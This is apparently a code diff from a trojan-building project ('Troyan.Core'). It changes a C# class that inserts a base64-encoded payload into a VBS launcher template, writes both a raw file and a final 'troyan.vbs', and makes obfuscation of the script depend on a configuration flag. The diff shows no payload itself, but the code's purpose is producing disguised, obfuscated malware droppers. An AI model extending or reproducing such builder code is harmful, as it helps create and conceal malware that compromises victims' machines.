@@ -1,13 +1,19 @@
 using Commons;
+using Microsoft.Extensions.Options;
 
 namespace Troyan.Core;
 
-/// <summary>Writes <c>nonobfuscated.vbs</c> (raw) then final <c>troyan.vbs</c> via <see cref="ITroyanVbsObfuscator"/>.</summary>
+/// <summary>Writes <c>nonobfuscated.vbs</c> (raw) then final <c>troyan.vbs</c> (obfuscated when <see cref="TroyanObfuscationOptions.Vbs"/> is true).</summary>
 public sealed class TroyanPlainVbsEmitter : ITroyanPlainVbsEmitter
 {
     private readonly ITroyanVbsObfuscator _obfuscator;
+    private readonly TroyanObfuscationOptions _obfuscation;
 
-    public TroyanPlainVbsEmitter(ITroyanVbsObfuscator obfuscator) => _obfuscator = obfuscator;
+    public TroyanPlainVbsEmitter(ITroyanVbsObfuscator obfuscator, IOptions<TroyanObfuscationOptions> obfuscation)
+    {
+        _obfuscator = obfuscator;
+        _obfuscation = obfuscation.Value;
+    }
 
     public void Write(ServerLayoutPaths layout)
     {
@@ -26,7 +32,7 @@ public sealed class TroyanPlainVbsEmitter : ITroyanPlainVbsEmitter
             throw new InvalidOperationException("launcher.vbs must contain the 0102 placeholder.");
 
         var plain = template.Replace(placeholder, b64, StringComparison.Ordinal);
-        var final = _obfuscator.Obfuscate(plain);
+        var final = _obfuscation.Vbs ? _obfuscator.Obfuscate(plain) : plain;
 
         var dir = Path.GetDirectoryName(layout.TroyanOutputVbs);
         if (!string.IsNullOrEmpty(dir))
